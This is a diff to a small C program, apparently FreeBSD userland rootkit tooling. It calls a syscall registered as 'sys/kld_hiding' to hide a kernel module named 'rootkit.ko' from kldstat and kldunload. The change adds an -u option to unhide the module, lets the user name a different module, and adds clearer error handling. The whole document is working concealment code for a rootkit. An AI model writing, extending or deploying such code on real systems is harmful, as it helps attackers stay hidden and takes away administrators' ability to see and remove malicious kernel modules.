@@ -29,18 +29,56 @@ find_syscall(const char *module_name)
     return module_stat.data.intval;
 }
 
-int
-main(void)
+static void
+usage(void)
 {
+    fprintf(stderr, "usage: hide_kld [-u] [module_name]\n");
+    fprintf(stderr, "  no arguments  hide rootkit.ko\n");
+    fprintf(stderr, "  -u            stop hiding, so kldstat and kldunload see it\n");
+}
+
+int
+main(int argc, char **argv)
+{
+    const char *name = "rootkit.ko";
     int hide_module_syscall;
+    int unhide = 0;
+    int ch;
+
+    while ((ch = getopt(argc, argv, "u")) != -1) {
+        switch (ch) {
+        case 'u':
+            unhide = 1;
+            break;
+        default:
+            usage();
+            return 1;
+        }
+    }
+    argc -= optind;
+    argv += optind;
+
+    if (argc > 1) {
+        usage();
+        return 1;
+    }
+    if (argc == 1)
+        name = argv[0];
 
     hide_module_syscall = find_syscall("sys/kld_hiding");
     if (hide_module_syscall == -1) {
-        return 1;
+        /*
+         * Not found usually means the module is already unloaded, which is
+         * the state an uninstall is trying to reach; say so instead of
+         * failing with a bare error.
+         */
+        fprintf(stderr, "hide_kld: sys/kld_hiding is not registered "
+            "(module not loaded?)\n");
+        return unhide ? 0 : 1;
     }
 
-    if (syscall(hide_module_syscall, "rootkit.ko") == -1) {
-        perror("hide rootkit.ko");
+    if (syscall(hide_module_syscall, unhide ? "" : name) == -1) {
+        perror(unhide ? "unhide" : "hide");
         return 1;
     }
 
